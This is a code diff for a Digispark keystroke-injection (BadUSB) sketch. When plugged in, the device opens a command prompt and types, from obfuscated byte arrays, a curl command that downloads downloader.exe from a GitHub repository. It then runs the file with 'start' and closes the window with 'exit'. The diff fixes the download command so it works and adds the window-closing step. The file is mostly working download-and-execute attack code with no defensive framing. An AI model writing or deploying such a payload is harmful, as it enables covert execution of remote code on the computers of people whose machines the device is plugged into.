@@ -10,10 +10,12 @@
 
 // cmd
 const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7};
-// curl -L -o https://github.com/fezarosa-dev/entrega_edu_fis/raw/main/downloader.exe
-const uint8_t key_arr_1[] PROGMEM = {0,6, 0,24, 0,21, 0,15, 0,44, 0,45, 2,15, 0,44, 0,45, 0,18, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,56, 64,20, 64,20, 0,10, 0,12, 0,23, 0,11, 0,24, 0,5, 0,55, 0,6, 0,18, 0,16, 64,20, 0,9, 0,8, 0,29, 0,4, 0,21, 0,18, 0,22, 0,4, 0,45, 0,7, 0,8, 0,25, 64,20, 0,8, 0,17, 0,23, 0,21, 0,8, 0,10, 0,4, 2,45, 0,8, 0,7, 0,24, 2,45, 0,9, 0,12, 0,22, 64,20, 0,21, 0,4, 0,26, 64,20, 0,16, 0,4, 0,12, 0,17, 64,20, 0,7, 0,18, 0,26, 0,17, 0,15, 0,18, 0,4, 0,7, 0,8, 0,21, 0,55, 0,8, 0,27, 0,8};
+// curl -L -o downloader.exe https://github.com/fezarosa-dev/entrega_edu_fis/raw/main/downloader.exe
+const uint8_t key_arr_1[] PROGMEM = {0,6, 0,24, 0,21, 0,15, 0,44, 0,45, 2,15, 0,44, 0,45, 0,18, 0,44, 0,7, 0,18, 0,26, 0,17, 0,15, 0,18, 0,4, 0,7, 0,8, 0,21, 0,55, 0,8, 0,27, 0,8, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,56, 64,20, 64,20, 0,10, 0,12, 0,23, 0,11, 0,24, 0,5, 0,55, 0,6, 0,18, 0,16, 64,20, 0,9, 0,8, 0,29, 0,4, 0,21, 0,18, 0,22, 0,4, 0,45, 0,7, 0,8, 0,25, 64,20, 0,8, 0,17, 0,23, 0,21, 0,8, 0,10, 0,4, 2,45, 0,8, 0,7, 0,24, 2,45, 0,9, 0,12, 0,22, 64,20, 0,21, 0,4, 0,26, 64,20, 0,16, 0,4, 0,12, 0,17, 64,20, 0,7, 0,18, 0,26, 0,17, 0,15, 0,18, 0,4, 0,7, 0,8, 0,21, 0,55, 0,8, 0,27, 0,8};
 // start downloader.exe
 const uint8_t key_arr_2[] PROGMEM = {0,22, 0,23, 0,4, 0,21, 0,23, 0,44, 0,7, 0,18, 0,26, 0,17, 0,15, 0,18, 0,4, 0,7, 0,8, 0,21, 0,55, 0,8, 0,27, 0,8};
+// exit
+const uint8_t key_arr_3[] PROGMEM = {0,8, 0,27, 0,12, 0,23};
 
 void duckyString(const uint8_t* keys, size_t len) {  
     for(size_t i=0; i<len; i+=2) {
@@ -49,11 +51,14 @@ void setup() {
     DigiKeyboard.delay(500); // DELAY 500
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
     DigiKeyboard.delay(700); // DELAY 700
-    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING curl -L -o https://github.com/fezarosa-...
+    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING curl -L -o downloader.exe https://githu...
     DigiKeyboard.delay(500); // DELAY 500
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
     DigiKeyboard.delay(700); // DELAY 700
     duckyString(key_arr_2, sizeof(key_arr_2)); // STRING start downloader.exe
+    DigiKeyboard.delay(500); // DELAY 500
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING exit
     DigiKeyboard.delay(500); // DELAY 500
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
     digitalWrite(1, LOW); // LED OFF
